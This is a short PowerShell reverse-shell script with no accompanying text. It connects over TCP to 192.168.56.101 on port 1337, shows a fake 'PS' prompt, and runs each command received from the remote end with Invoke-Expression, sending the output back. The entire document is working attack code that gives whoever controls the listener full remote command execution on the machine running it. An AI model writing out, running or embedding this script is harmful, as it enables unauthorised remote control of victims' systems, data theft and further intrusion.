$LHOST = "192.168.56.101"
$LPORT = 1337
$client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$buffer = New-Object System.Byte[] 1024
$encoding = New-Object System.Text.ASCIIEncoding

do {
    $writer.Write("PS " + (pwd).Path + "> ")
    $writer.Flush()
    $read = $stream.Read($buffer, 0, 1024)
    $cmd = $encoding.GetString($buffer, 0, $read)
    $output = try { iex $cmd 2>&1 | Out-String } catch { $_ | Out-String }
    $writer.WriteLine($output)
    $writer.Flush()
} while ($client.Connected)

$writer.Close()
$stream.Close()
$client.Close()